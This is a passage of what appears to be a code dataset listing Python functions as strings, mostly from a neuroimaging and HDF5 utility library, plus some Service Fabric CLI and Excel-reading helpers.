            "def get_3D_from_4D(image, vol_idx=0):\n    \"\"\"Pick one 3D volume from a 4D nifti image file\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Volume defining different ROIs.\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    vol_idx: int\n        Index of the 3D volume to be extracted from the 4D volume.\n\n    Returns\n    -------\n    vol, hdr, aff\n        The data array, the image header and the affine transform matrix.\n    \"\"\"\n    img      = check_img(image)\n    hdr, aff = get_img_info(img)\n\n    if len(img.shape) != 4:\n        raise AttributeError('Volume in {} does not have 4 dimensions.'.format(repr_imgs(img)))\n\n    if not 0 <= vol_idx < img.shape[3]:\n        raise IndexError('IndexError: 4th dimension in volume {} has {} volumes, '\n                         'not {}.'.format(repr_imgs(img), img.shape[3], vol_idx))\n\n    img_data = img.get_data()\n    new_vol  = img_data[:, :, :, vol_idx].copy()\n\n    hdr.set_data_shape(hdr.get_data_shape()[:3])\n\n    return new_vol, hdr, aff"
        ],
        [
            "def get_dataset(self, ds_name, mode='r'):\n        \"\"\"\n        Returns a h5py dataset given its registered name.\n\n        :param ds_name: string\n        Name of the dataset to be returned.\n\n        :return:\n        \"\"\"\n        if ds_name in self._datasets:\n            return self._datasets[ds_name]\n        else:\n            return self.create_empty_dataset(ds_name)"
        ],
        [
            "def create_empty_dataset(self, ds_name, dtype=np.float32):\n        \"\"\"\n        Creates a Dataset with unknown size.\n        Resize it before using.\n\n        :param ds_name: string\n\n        :param dtype: dtype\n        Datatype of the dataset\n\n        :return: h5py DataSet\n        \"\"\"\n        if ds_name in self._datasets:\n            return self._datasets[ds_name]\n\n        ds = self._group.create_dataset(ds_name, (1, 1), maxshape=None,\n                                        dtype=dtype)\n        self._datasets[ds_name] = ds\n\n        return ds"
        ],
        [
            "def create_dataset(self, ds_name, data, attrs=None, dtype=None):\n        \"\"\"\n        Saves a Numpy array in a dataset in the HDF file, registers it as\n        ds_name and returns the h5py dataset.\n\n        :param ds_name: string\n        Registration name of the dataset to be registered.\n\n        :param data: Numpy ndarray\n\n        :param dtype: dtype\n        Datatype of the dataset\n\n        :return: h5py dataset\n        \"\"\"\n        if ds_name in self._datasets:\n            ds = self._datasets[ds_name]\n            if ds.dtype != data.dtype:\n                warnings.warn('Dataset and data dtype are different!')\n\n        else:\n            if dtype is None:\n                dtype = data.dtype\n\n            ds = self._group.create_dataset(ds_name, data.shape,\n                                            dtype=dtype)\n\n            if attrs is not None:\n                for key in attrs:\n                    setattr(ds.attrs, key, attrs[key])\n\n        ds.read_direct(data)\n        self._datasets[ds_name] = ds\n\n        return ds"
        ],
        [
            "def save(self, ds_name, data, dtype=None):\n        \"\"\"\n        See create_dataset.\n        \"\"\"\n        return self.create_dataset(ds_name, data, dtype)"
        ],
        [
            "def _fill_missing_values(df, range_values, fill_value=0, fill_method=None):\n        \"\"\"\n        Will get the names of the index colums of df, obtain their ranges from\n        range_values dict and return a reindexed version of df with the given\n        range values.\n\n        :param df: pandas DataFrame\n\n        :param range_values: dict or array-like\n        Must contain for each index column of df an entry with all the values\n        within the range of the column.\n\n        :param fill_value: scalar or 'nearest', default 0\n        Value to use for missing values. Defaults to 0, but can be any\n        \"compatible\" value, e.g., NaN.\n        The 'nearest' mode will fill the missing value with the nearest value in\n         the column.\n\n        :param fill_method:  {'backfill', 'bfill', 'pad', 'ffill', None}, default None\n        Method to use for filling holes in reindexed DataFrame\n        'pad' / 'ffill': propagate last valid observation forward to next valid\n        'backfill' / 'bfill': use NEXT valid observation to fill gap\n\n        :return: pandas Dataframe and used column ranges\n        reindexed DataFrame and dict with index column ranges\n        \"\"\"\n        idx_colnames  = df.index.names\n\n        idx_colranges = [range_values[x] for x in idx_colnames]\n\n        fullindex = pd.Index([p for p in product(*idx_colranges)],\n                             name=tuple(idx_colnames))\n\n        fulldf = df.reindex(index=fullindex, fill_value=fill_value,\n                            method=fill_method)\n\n        fulldf.index.names = idx_colnames\n\n        return fulldf, idx_colranges"
        ],
        [
            "def get(self, key):\n        \"\"\"\n        Retrieve pandas object or group of Numpy ndarrays\n        stored in file\n\n        Parameters\n        ----------\n        key : object\n\n        Returns\n        -------\n        obj : type of object stored in file\n        \"\"\"\n        node = self.get_node(key)\n        if node is None:\n            raise KeyError('No object named %s in the file' % key)\n\n        if hasattr(node, 'attrs'):\n            if 'pandas_type' in node.attrs:\n                return self._read_group(node)\n\n        return self._read_array(node)"
        ],
        [
            "def put(self, key, value, attrs=None, format=None, append=False, **kwargs):\n        \"\"\"\n        Store object in HDFStore\n\n        Parameters\n        ----------\n        key : str\n\n        value : {Series, DataFrame, Panel, Numpy ndarray}\n\n        format : 'fixed(f)|table(t)', default is 'fixed'\n            fixed(f) : Fixed format\n                Fast writing/reading. Not-appendable, nor searchable\n\n            table(t) : Table format\n                Write as a PyTables Table structure which may perform worse but allow more flexible operations\n                like searching/selecting subsets of the data\n\n        append : boolean, default False\n            This will force Table format, append the input data to the\n            existing.\n\n        encoding : default None, provide an encoding for strings\n        \"\"\"\n        if not isinstance(value, np.ndarray):\n            super(NumpyHDFStore, self).put(key, value, format, append, **kwargs)\n        else:\n            group = self.get_node(key)\n\n            # remove the node if we are not appending\n            if group is not None and not append:\n                self._handle.removeNode(group, recursive=True)\n                group = None\n\n            if group is None:\n                paths = key.split('/')\n\n                # recursively create the groups\n                path = '/'\n                for p in paths:\n                    if not len(p):\n                        continue\n                    new_path = path\n                    if not path.endswith('/'):\n                        new_path += '/'\n                    new_path += p\n                    group = self.get_node(new_path)\n                    if group is None:\n                        group = self._handle.createGroup(path, p)\n                    path = new_path\n\n            ds_name = kwargs.get('ds_name', self._array_dsname)\n\n            ds = self._handle.createArray(group, ds_name, value)\n            if attrs is not None:\n                for key in attrs:\n                    setattr(ds.attrs, key, attrs[key])\n\n            self._handle.flush()\n\n            return ds"
        ],
        [
            "def put_df_as_ndarray(self, key, df, range_values, loop_multiindex=False,\n                          unstack=False, fill_value=0, fill_method=None):\n        \"\"\"Returns a PyTables HDF Array from df in the shape given by its index columns range values.\n\n        :param key: string object\n\n        :param df: pandas DataFrame\n\n        :param range_values: dict or array-like\n        Must contain for each index column of df an entry with all the values\n        within the range of the column.\n\n        :param loop_multiindex: bool\n        Will loop through the first index in a multiindex dataframe, extract a\n        dataframe only for one value, complete and fill the missing values and\n        store in the HDF.\n        If this is True, it will not use unstack.\n        This is as fast as unstacking.\n\n        :param unstack: bool\n        Unstack means that this will use the first index name to\n        unfold the DataFrame, and will create a group with as many datasets\n        as valus has this first index.\n        Use this if you think the filled dataframe won't fit in your RAM memory.\n        If set to False, this will transform the dataframe in memory first\n        and only then save it.\n\n        :param fill_value: scalar or 'nearest', default 0\n        Value to use for missing values. Defaults to 0, but can be any\n        \"compatible\" value, e.g., NaN.\n        The 'nearest' mode will fill the missing value with the nearest value in\n         the column.\n\n        :param fill_method:  {'backfill', 'bfill', 'pad', 'ffill', None}, default None\n        Method to use for filling holes in reindexed DataFrame\n        'pad' / 'ffill': propagate last valid observation forward to next valid\n        'backfill' / 'bfill': use NEXT valid observation to fill gap\n\n        :return: PyTables data node\n        \"\"\"\n        idx_colnames = df.index.names\n        #idx_colranges = [range_values[x] for x in idx_colnames]\n\n        #dataset group name if not given\n        if key is None:\n            key = idx_colnames[0]\n\n        if loop_multiindex:\n            idx_values = df.index.get_level_values(0).unique()\n\n            for idx in idx_values:\n                vals, _ = self._fill_missing_values(df.xs((idx,), level=idx_colnames[0]),\n                                                    range_values,\n                                                    fill_value=fill_value,\n                                                    fill_method=fill_method)\n\n                ds_name = str(idx) + '_' + '_'.join(vals.columns)\n\n                self._push_dfblock(key, vals, ds_name, range_values)\n\n            return self._handle.get_node('/' + str(key))\n\n        #separate the dataframe into blocks, only with the first index\n        else:\n            if unstack:\n                df = df.unstack(idx_colnames[0])\n                for idx in df:\n                    vals, _ = self._fill_missing_values(df[idx], range_values,\n                                                        fill_value=fill_value,\n                                                        fill_method=fill_method)\n                    vals = np.nan_to_num(vals)\n\n                    ds_name = '_'.join([str(x) for x in vals.name])\n\n                    self._push_dfblock(key, vals, ds_name, range_values)\n\n                return self._handle.get_node('/' + str(key))\n\n        #not separate the data\n        vals, _ = self._fill_missing_values(df, range_values,\n                                            fill_value=fill_value,\n                                            fill_method=fill_method)\n\n        ds_name = self._array_dsname\n\n        return self._push_dfblock(key, vals, ds_name, range_values)"
        ],
        [
            "def smooth_fwhm(self, fwhm):\n        \"\"\" Set a smoothing Gaussian kernel given its FWHM in mm.  \"\"\"\n        if fwhm != self._smooth_fwhm:\n            self._is_data_smooth = False\n        self._smooth_fwhm = fwhm"
        ],
        [
            "def apply_mask(self, mask_img):\n        \"\"\"First set_mask and the get_masked_data.\n\n        Parameters\n        ----------\n        mask_img:  nifti-like image, NeuroImage or str\n            3D mask array: True where a voxel should be used.\n            Can either be:\n            - a file path to a Nifti image\n            - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n            If niimg is a string, consider it as a path to Nifti image and\n            call nibabel.load on it. If it is an object, check if get_data()\n            and get_affine() methods are present, raise TypeError otherwise.\n\n        Returns\n        -------\n        The masked data deepcopied\n        \"\"\"\n        self.set_mask(mask_img)\n        return self.get_data(masked=True, smoothed=True, safe_copy=True)"
        ],
        [
            "def set_mask(self, mask_img):\n        \"\"\"Sets a mask img to this. So every operation to self, this mask will be taken into account.\n\n        Parameters\n        ----------\n        mask_img: nifti-like image, NeuroImage or str\n            3D mask array: True where a voxel should be used.\n            Can either be:\n            - a file path to a Nifti image\n            - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n            If niimg is a string, consider it as a path to Nifti image and\n            call nibabel.load on it. If it is an object, check if get_data()\n            and get_affine() methods are present, raise TypeError otherwise.\n\n        Note\n        ----\n        self.img and mask_file must have the same shape.\n\n        Raises\n        ------\n        FileNotFound, NiftiFilesNotCompatible\n        \"\"\"\n        mask = load_mask(mask_img, allow_empty=True)\n        check_img_compatibility(self.img, mask, only_check_3d=True) # this will raise an exception if something is wrong\n        self.mask = mask"
        ],
        [
            "def _mask_data(self, data):\n        \"\"\"Return the data masked with self.mask\n\n        Parameters\n        ----------\n        data: np.ndarray\n\n        Returns\n        -------\n        masked np.ndarray\n\n        Raises\n        ------\n        ValueError if the data and mask dimensions are not compatible.\n        Other exceptions related to numpy computations.\n        \"\"\"\n        self._check_for_mask()\n\n        msk_data = self.mask.get_data()\n        if self.ndim == 3:\n            return data[msk_data], np.where(msk_data)\n        elif self.ndim == 4:\n            return _apply_mask_to_4d_data(data, self.mask)\n        else:\n            raise ValueError('Cannot mask {} with {} dimensions using mask {}.'.format(self, self.ndim, self.mask))"
        ],
        [
            "def apply_smoothing(self, smooth_fwhm):\n        \"\"\"Set self._smooth_fwhm and then smooths the data.\n        See boyle.nifti.smooth.smooth_imgs.\n\n        Returns\n        -------\n        the smoothed data deepcopied.\n\n        \"\"\"\n        if smooth_fwhm <= 0:\n            return\n\n        old_smooth_fwhm   = self._smooth_fwhm\n        self._smooth_fwhm = smooth_fwhm\n        try:\n            data = self.get_data(smoothed=True, masked=True, safe_copy=True)\n        except ValueError as ve:\n            self._smooth_fwhm = old_smooth_fwhm\n            raise\n        else:\n            self._smooth_fwhm = smooth_fwhm\n            return data"
        ],
        [
            "def mask_and_flatten(self):\n        \"\"\"Return a vector of the masked data.\n\n        Returns\n        -------\n        np.ndarray, tuple of indices (np.ndarray), tuple of the mask shape\n        \"\"\"\n        self._check_for_mask()\n\n        return self.get_data(smoothed=True, masked=True, safe_copy=False)[self.get_mask_indices()],\\\n               self.get_mask_indices(), self.mask.shape"
        ],
        [
            "def to_file(self, outpath):\n        \"\"\"Save this object instance in outpath.\n\n        Parameters\n        ----------\n        outpath: str\n            Output file path\n        \"\"\"\n        if not self.has_mask() and not self.is_smoothed():\n            save_niigz(outpath, self.img)\n        else:\n            save_niigz(outpath, self.get_data(masked=True, smoothed=True),\n                       self.get_header(), self.get_affine())"
        ],
        [
            "def setup_logging(log_config_file=op.join(op.dirname(__file__), 'logger.yml'),\n                  log_default_level=LOG_LEVEL,\n                  env_key=MODULE_NAME.upper() + '_LOG_CFG'):\n    \"\"\"Setup logging configuration.\"\"\"\n    path = log_config_file\n    value = os.getenv(env_key, None)\n    if value:\n        path = value\n\n    if op.exists(path):\n        log_cfg = yaml.load(read(path).format(MODULE_NAME))\n        logging.config.dictConfig(log_cfg)\n        #print('Started logging using config file {0}.'.format(path))\n    else:\n        logging.basicConfig(level=log_default_level)\n        #print('Started default logging. Could not find config file '\n        #      'in {0}.'.format(path))\n    log = logging.getLogger(__name__)\n    log.debug('Start logging.')"
        ],
        [
            "def get_3D_from_4D(filename, vol_idx=0):\n    \"\"\"Return a 3D volume from a 4D nifti image file\n\n    Parameters\n    ----------\n    filename: str\n        Path to the 4D .mhd file\n\n    vol_idx: int\n        Index of the 3D volume to be extracted from the 4D volume.\n\n    Returns\n    -------\n    vol, hdr\n        The data array and the new 3D image header.\n    \"\"\"\n    def remove_4th_element_from_hdr_string(hdr, fieldname):\n        if fieldname in hdr:\n            hdr[fieldname] = ' '.join(hdr[fieldname].split()[:3])\n\n    vol, hdr = load_raw_data_with_mhd(filename)\n\n    if vol.ndim != 4:\n        raise ValueError('Volume in {} does not have 4 dimensions.'.format(op.join(op.dirname(filename),\n                                                                                   hdr['ElementDataFile'])))\n\n    if not 0 <= vol_idx < vol.shape[3]:\n        raise IndexError('IndexError: 4th dimension in volume {} has {} volumes, not {}.'.format(filename,\n                                                                                                 vol.shape[3], vol_idx))\n\n    new_vol = vol[:, :, :, vol_idx].copy()\n\n    hdr['NDims'] = 3\n    remove_4th_element_from_hdr_string(hdr, 'ElementSpacing')\n    remove_4th_element_from_hdr_string(hdr, 'DimSize')\n\n    return new_vol, hdr"
        ],
        [
            "def _safe_cache(memory, func, **kwargs):\n    \"\"\" A wrapper for mem.cache that flushes the cache if the version\n        number of nibabel has changed.\n    \"\"\"\n    cachedir = memory.cachedir\n\n    if cachedir is None or cachedir in __CACHE_CHECKED:\n        return memory.cache(func, **kwargs)\n\n    version_file = os.path.join(cachedir, 'module_versions.json')\n\n    versions = dict()\n    if os.path.exists(version_file):\n        with open(version_file, 'r') as _version_file:\n            versions = json.load(_version_file)\n\n    modules = (nibabel, )\n    # Keep only the major + minor version numbers\n    my_versions = dict((m.__name__, LooseVersion(m.__version__).version[:2])\n                       for m in modules)\n    commons = set(versions.keys()).intersection(set(my_versions.keys()))\n    collisions = [m for m in commons if versions[m] != my_versions[m]]\n\n    # Flush cache if version collision\n    if len(collisions) > 0:\n        if nilearn.CHECK_CACHE_VERSION:\n            warnings.warn(\"Incompatible cache in %s: \"\n                          \"different version of nibabel. Deleting \"\n                          \"the cache. Put nilearn.CHECK_CACHE_VERSION \"\n                          \"to false to avoid this behavior.\"\n                          % cachedir)\n            try:\n                tmp_dir = (os.path.split(cachedir)[:-1]\n                           + ('old_%i' % os.getpid(), ))\n                tmp_dir = os.path.join(*tmp_dir)\n                # We use rename + unlink to be more robust to race\n                # conditions\n                os.rename(cachedir, tmp_dir)\n                shutil.rmtree(tmp_dir)\n            except OSError:\n                # Another process could have removed this dir\n                pass\n\n            try:\n                os.makedirs(cachedir)\n            except OSError:\n                # File exists?\n                pass\n        else:\n            warnings.warn(\"Incompatible cache in %s: \"\n                          \"old version of nibabel.\" % cachedir)\n\n    # Write json files if configuration is different\n    if versions != my_versions:\n        with open(version_file, 'w') as _version_file:\n            json.dump(my_versions, _version_file)\n\n    __CACHE_CHECKED[cachedir] = True\n\n    return memory.cache(func, **kwargs)"
        ],
        [
            "def spatialimg_to_hdfgroup(h5group, spatial_img):\n    \"\"\"Saves a Nifti1Image into an HDF5 group.\n\n    Parameters\n    ----------\n    h5group: h5py Group\n        Output HDF5 file path\n\n    spatial_img: nibabel SpatialImage\n        Image to be saved\n\n    h5path: str\n        HDF5 group path where the image data will be saved.\n        Datasets will be created inside the given group path:\n        'data', 'extra', 'affine', the header information will\n        be set as attributes of the 'data' dataset.\n\n    \"\"\"\n    try:\n        h5group['data']   = spatial_img.get_data()\n        h5group['affine'] = spatial_img.get_affine()\n\n        if hasattr(h5group, 'get_extra'):\n            h5group['extra'] = spatial_img.get_extra()\n\n        hdr = spatial_img.get_header()\n        for k in list(hdr.keys()):\n            h5group['data'].attrs[k] = hdr[k]\n\n    except ValueError as ve:\n        raise Exception('Error creating group ' + h5group.name) from ve"
        ],
        [
            "def spatialimg_to_hdfpath(file_path, spatial_img, h5path=None, append=True):\n    \"\"\"Saves a Nifti1Image into an HDF5 file.\n\n    Parameters\n    ----------\n    file_path: string\n        Output HDF5 file path\n\n    spatial_img: nibabel SpatialImage\n        Image to be saved\n\n    h5path: string\n        HDF5 group path where the image data will be saved.\n        Datasets will be created inside the given group path:\n        'data', 'extra', 'affine', the header information will\n        be set as attributes of the 'data' dataset.\n        Default: '/img'\n\n    append: bool\n        True if you don't want to erase the content of the file\n        if it already exists, False otherwise.\n\n    Note\n    ----\n    HDF5 open modes\n    >>> 'r' Readonly, file must exist\n    >>> 'r+' Read/write, file must exist\n    >>> 'w' Create file, truncate if exists\n    >>> 'w-' Create file, fail if exists\n    >>> 'a' Read/write if exists, create otherwise (default)\n\n    \"\"\"\n    if h5path is None:\n        h5path = '/img'\n\n    mode = 'w'\n    if os.path.exists(file_path):\n        if append:\n            mode = 'a'\n\n    with h5py.File(file_path, mode) as f:\n        try:\n            h5img = f.create_group(h5path)\n            spatialimg_to_hdfgroup(h5img, spatial_img)\n\n        except ValueError as ve:\n            raise Exception('Error creating group ' + h5path) from ve"
        ],
        [
            "def get_nifti1hdr_from_h5attrs(h5attrs):\n    \"\"\"Transforms an H5py Attributes set to a dict.\n    Converts unicode string keys into standard strings\n    and each value into a numpy array.\n\n    Parameters\n    ----------\n    h5attrs: H5py Attributes\n\n    Returns\n    --------\n    dict\n    \"\"\"\n    hdr = nib.Nifti1Header()\n    for k in list(h5attrs.keys()):\n        hdr[str(k)] = np.array(h5attrs[k])\n\n    return hdr"
        ],
        [
            "def all_childnodes_to_nifti1img(h5group):\n    \"\"\"Returns in a list all images found under h5group.\n\n    Parameters\n    ----------\n    h5group: h5py.Group\n        HDF group\n\n    Returns\n    -------\n    list of nifti1Image\n    \"\"\"\n    child_nodes = []\n    def append_parent_if_dataset(name, obj):\n        if isinstance(obj, h5py.Dataset):\n            if name.split('/')[-1] == 'data':\n                child_nodes.append(obj.parent)\n\n    vols = []\n    h5group.visititems(append_parent_if_dataset)\n    for c in child_nodes:\n        vols.append(hdfgroup_to_nifti1image(c))\n\n    return vols"
        ],
        [
            "def insert_volumes_in_one_dataset(file_path, h5path, file_list, newshape=None,\n                                  concat_axis=0, dtype=None, append=True):\n    \"\"\"Inserts all given nifti files from file_list into one dataset in fname.\n    This will not check if the dimensionality of all files match.\n\n    Parameters\n    ----------\n    file_path: string\n        HDF5 file path\n\n    h5path: string\n\n    file_list: list of strings\n\n    newshape: tuple or lambda function\n        If None, it will not reshape the images.\n        If a lambda function, this lambda will receive only the shape array.\n        e.g., newshape = lambda x: (np.prod(x[0:3]), x[3])\n        If a tuple, it will try to reshape all the images with the same shape.\n        It must work for all the images in file_list.\n\n    concat_axis: int\n        Axis of concatenation after reshaping\n\n    dtype: data type\n    Dataset data type\n    If not set, will use the type of the first file.\n\n    append: bool\n\n    Raises\n    ------\n    ValueError if concat_axis is bigger than data dimensionality.\n\n    Note\n    ----\n    For now, this only works if the dataset ends up being a 2D matrix.\n    I haven't tested for multi-dimensionality concatenations.\n    \"\"\"\n\n    def isalambda(v):\n        return isinstance(v, type(lambda: None)) and v.__name__ == '<lambda>'\n\n    mode = 'w'\n    if os.path.exists(file_path):\n        if append:\n            mode = 'a'\n\n    #loading the metadata into spatialimages\n    imgs = [nib.load(vol) for vol in file_list]\n\n    #getting the shapes of all volumes\n    shapes = [np.array(img.get_shape()) for img in imgs]\n\n    #getting the reshaped shapes\n    if newshape is not None:\n        if isalambda(newshape):\n            nushapes = np.array([newshape(shape) for shape in shapes])\n        else:\n            nushapes = np.array([shape for shape in shapes])\n\n    #checking if concat_axis is available in this new shapes\n    for nushape in nushapes:\n        assert(len(nushape) - 1 < concat_axis)\n\n    #calculate the shape of the new dataset\n    n_dims = nushapes.shape[1]\n    ds_shape = np.zeros(n_dims, dtype=np.int)\n    for a in list(range(n_dims)):\n        if a == concat_axis:\n            ds_shape[a] = np.sum(nushapes[:, concat_axis])\n        else:\n            ds_shape[a] = np.max(nushapes[:, a])\n\n    #get the type of the new dataset\n    #dtypes = [img.get_data_dtype() for img in imgs]\n    if dtype is None:\n        dtype = imgs[0].get_data_dtype()\n\n    with h5py.File(file_path, mode) as f:\n        try:\n            ic = 0\n            h5grp = f.create_group(os.path.dirname(h5path))\n            h5ds = h5grp.create_dataset(os.path.basename(h5path),\n                                        ds_shape, dtype)\n            for img in imgs:\n\n                #get the shape of the current image\n                nushape = nushapes[ic, :]\n\n                def append_to_dataset(h5ds, idx, data, concat_axis):\n                    \"\"\"\n                    @param h5ds: H5py DataSet\n                    @param idx: int\n                    @param data: ndarray\n                    @param concat_axis: int\n                    @return:\n                    \"\"\"\n                    shape = data.shape\n                    ndims = len(shape)\n\n                    if ndims == 1:\n                        if concat_axis == 0:\n                            h5ds[idx] = data\n\n                    elif ndims == 2:\n                        if concat_axis == 0:\n                            h5ds[idx ] = data\n                        elif concat_axis == 1:\n                            h5ds[idx ] = data\n\n                    elif ndims == 3:\n                        if concat_axis == 0:\n                            h5ds[idx ] = data\n                        elif concat_axis == 1:\n                            h5ds[idx ] = data\n                        elif concat_axis == 2:\n                            h5ds[idx ] = data\n\n                #appending the reshaped image into the dataset\n                append_to_dataset(h5ds, ic,\n                                  np.reshape(img.get_data(), tuple(nushape)),\n                                  concat_axis)\n\n                ic += 1\n\n        except ValueError as ve:\n            raise Exception('Error creating group {} in hdf file {}'.format(h5path, file_path)) from ve"
        ],
        [
            "def treefall(iterable):\n    \"\"\"\n    Generate all combinations of the elements of iterable and its subsets.\n\n    Parameters\n    ----------\n    iterable: list, set or dict or any iterable object\n\n    Returns\n    -------\n    A generator of all possible combinations of the iterable.\n\n    Example:\n    -------\n    >>> for i in treefall([1, 2, 3, 4, 5]): print(i)\n    >>> (1, 2, 3)\n    >>> (1, 2)\n    >>> (1, 3)\n    >>> (2, 3)\n    >>> (1,)\n    >>> (2,)\n    >>> (3,)\n    >>> ()\n    \"\"\"\n    num_elems = len(iterable)\n    for i in range(num_elems, -1, -1):\n        for c in combinations(iterable, i):\n            yield c"
        ],
        [
            "def get_reliabledictionary_list(client, application_name, service_name):\n    \"\"\"List existing reliable dictionaries.\n\n    List existing reliable dictionaries and respective schema for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    \"\"\"\n    cluster = Cluster.from_sfclient(client)\n    service = cluster.get_application(application_name).get_service(service_name)\n    for dictionary in service.get_dictionaries():\n        print(dictionary.name)"
        ],
        [
            "def get_reliabledictionary_schema(client, application_name, service_name, dictionary_name, output_file=None):\n    \"\"\"Query Schema information for existing reliable dictionaries.\n\n    Query Schema information existing reliable dictionaries for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    :param dictionary: Name of the reliable dictionary.\n    :type dictionary: str\n    :param output_file: Optional file to save the schema.\n    \"\"\"\n    cluster = Cluster.from_sfclient(client)\n    dictionary = cluster.get_application(application_name).get_service(service_name).get_dictionary(dictionary_name)\n    \n    result = json.dumps(dictionary.get_information(), indent=4)\n    \n    if (output_file == None):\n        output_file = \"{}-{}-{}-schema-output.json\".format(application_name, service_name, dictionary_name)\n    \n    with open(output_file, \"w\") as output:\n        output.write(result)\n    print('Printed schema information to: ' + output_file)\n    print(result)"
        ],
        [
            "def query_reliabledictionary(client, application_name, service_name, dictionary_name, query_string, partition_key=None, partition_id=None, output_file=None):\n    \"\"\"Query existing reliable dictionary.\n\n    Query existing reliable dictionaries for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    :param dictionary_name: Name of the reliable dictionary.\n    :type dictionary_name: str\n    :param query_string: An OData query string. For example $top=10. Check https://www.odata.org/documentation/ for more information.\n    :type query_string: str\n    :param partition_key: Optional partition key of the desired partition, either a string if named schema or int if Int64 schema\n    :type partition_id: str\n    :param partition_id: Optional partition GUID of the owning reliable dictionary.\n    :type partition_id: str\n    :param output_file: Optional file to save the schema.\n    \"\"\"\n    cluster = Cluster.from_sfclient(client)\n    dictionary = cluster.get_application(application_name).get_service(service_name).get_dictionary(dictionary_name)\n    \n    \n    start = time.time()\n    if (partition_id != None):\n        result = dictionary.query(query_string, PartitionLookup.ID, partition_id)\n    elif (partition_key != None):\n        result = dictionary.query(query_string, PartitionLookup.KEY, partition_key)\n    else:\n        result = dictionary.query(query_string)\n    \n    if type(result) is str:\n        print(result)\n        return\n    else:\n        result = json.dumps(result.get(\"value\"), indent=4)\n    \n    print(\"Query took \" + str(time.time() - start) + \" seconds\")\n    \n    if (output_file == None):\n        output_file = \"{}-{}-{}-query-output.json\".format(application_name, service_name, dictionary_name)\n    \n    with open(output_file, \"w\") as output:\n        output.write(result)\n    print()\n    print('Printed output to: ' + output_file)\n    print(result)"
        ],
        [
            "def execute_reliabledictionary(client, application_name, service_name, input_file):\n    \"\"\"Execute create, update, delete operations on existing reliable dictionaries.\n\n    carry out create, update and delete operations on existing reliable dictionaries for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    :param output_file: input file with list of json to provide the operation information for reliable dictionaries.\n    \"\"\"\n\n    cluster = Cluster.from_sfclient(client)\n    service = cluster.get_application(application_name).get_service(service_name)\n\n    # call get service with headers and params\n    with open(input_file) as json_file:\n        json_data = json.load(json_file)\n        service.execute(json_data)\n    return"
        ],
        [
            "def select_arg_verify(endpoint, cert, key, pem, ca, aad, no_verify): #pylint: disable=invalid-name,too-many-arguments\n    \"\"\"Verify arguments for select command\"\"\"\n\n    if not (endpoint.lower().startswith('http')\n            or endpoint.lower().startswith('https')):\n        raise CLIError('Endpoint must be HTTP or HTTPS')\n\n    usage = ('Valid syntax : --endpoint [ [ --key --cert | --pem | --aad] '\n             '[ --ca | --no-verify ] ]')\n\n    if ca and not (pem or all([key, cert])):\n        raise CLIError(usage)\n\n    if no_verify and not (pem or all([key, cert]) or aad):\n        raise CLIError(usage)\n\n    if no_verify and ca:\n        raise CLIError(usage)\n\n    if any([cert, key]) and not all([cert, key]):\n        raise CLIError(usage)\n\n    if aad and any([pem, cert, key]):\n        raise CLIError(usage)\n\n    if pem and any([cert, key]):\n        raise CLIError(usage)"
        ],
        [
            "def get_aad_token(endpoint, no_verify):\n    #pylint: disable-msg=too-many-locals\n    \"\"\"Get AAD token\"\"\"\n    from azure.servicefabric.service_fabric_client_ap_is import (\n        ServiceFabricClientAPIs\n    )\n    from sfctl.auth import ClientCertAuthentication\n    from sfctl.config import set_aad_metadata\n\n    auth = ClientCertAuthentication(None, None, no_verify)\n\n    client = ServiceFabricClientAPIs(auth, base_url=endpoint)\n    aad_metadata = client.get_aad_metadata()\n\n    if aad_metadata.type != \"aad\":\n        raise CLIError(\"Not AAD cluster\")\n\n    aad_resource = aad_metadata.metadata\n\n    tenant_id = aad_resource.tenant\n    authority_uri = aad_resource.login + '/' + tenant_id\n    context = adal.AuthenticationContext(authority_uri,\n                                         api_version=None)\n    cluster_id = aad_resource.cluster\n    client_id = aad_resource.client\n\n    set_aad_metadata(authority_uri, cluster_id, client_id)\n\n    code = context.acquire_user_code(cluster_id, client_id)\n    print(code['message'])\n    token = context.acquire_token_with_device_code(\n        cluster_id, code, client_id)\n    print(\"Succeed!\")\n    return token, context.cache"
        ],
        [
            "def _openpyxl_read_xl(xl_path: str):\n    \"\"\" Use openpyxl to read an Excel file. \"\"\"\n    try:\n        wb = load_workbook(filename=xl_path, read_only=True)\n    except:\n        raise\n    else:\n        return wb"
        ],
        [
            "def _check_xl_path(xl_path: str):\n    \"\"\" Return the expanded absolute path of `xl_path` if\n    if exists and 'xlrd' or 'openpyxl' depending on\n    which module should be used for the Excel file in `xl_path`.\n\n    Parameters\n    ----------\n    xl_path: str\n        Path to an Excel file\n\n    Returns\n    -------\n    xl_path: str\n        User expanded and absolute path to `xl_path`\n\n    module: str\n        The name of the module you should use to process the\n        Excel file.\n        Choices: 'xlrd', 'pyopenxl'\n\n    Raises\n    ------\n    IOError\n        If the file does not exist\n\n    RuntimError\n        If a suitable reader for xl_path is not found\n    \"\"\"\n    xl_path = op.abspath(op.expanduser(xl_path))\n\n    if not op.isfile(xl_path):\n        raise IOError(\"Could not find file in {}.\".format(xl_path))\n\n    return xl_path, _use_openpyxl_or_xlrf(xl_path)"
        ],
        [
            "def read_xl(xl_path: str):\n    \"\"\" Return the workbook from the Excel file in `xl_path`.\"\"\"\n    xl_path, choice = _check_xl_path(xl_path)\n    reader = XL_READERS[choice]\n\n    return reader(xl_path)"
        ],
        [
            "def get_sheet_list(xl_path: str) -> List:\n    \"\"\"Return a list with the name of the sheets in\n    the Excel file in `xl_path`.\n    \"\"\"\n    wb = read_xl(xl_path)\n\n    if hasattr(wb, 'sheetnames'):\n        return wb.sheetnames\n    else:\n        return wb.sheet_names()"
        ],
        [
